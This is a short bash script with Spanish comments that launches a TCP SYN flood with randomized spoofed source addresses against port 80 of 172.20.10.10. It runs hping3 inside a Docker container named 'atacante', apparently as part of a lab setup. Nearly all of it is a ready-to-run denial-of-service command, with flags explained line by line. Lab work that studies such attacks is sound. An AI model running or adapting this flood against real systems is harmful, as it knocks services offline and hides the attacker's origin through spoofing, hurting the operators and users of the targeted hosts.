#!/bin/bash

# ==============================================================================
# Script Atacante - Capa 4 (TCP SYN Flood)
# ==============================================================================

TARGET_IP="172.20.10.10"

echo "======================================================"
echo " INICIANDO ATAQUE SYN FLOOD "
echo " Origen: Contenedor 'atacante' (IP spoofing activado)"
echo " Objetivo: $TARGET_IP:80"
echo " Presiona [Ctrl+C] para detener la ejecución."
echo "======================================================"

# Ejecutamos hping3 DESDE ADENTRO del contenedor atacante
# -S: Bandera SYN (Inicia la conexión)
# -p 80: Puerto objetivo
# --flood: Ataque sin pausa
# --rand-source: IP Spoofing (engaña al servidor)
sudo docker exec -it atacante hping3 -S -p 80 --flood --rand-source $TARGET_IP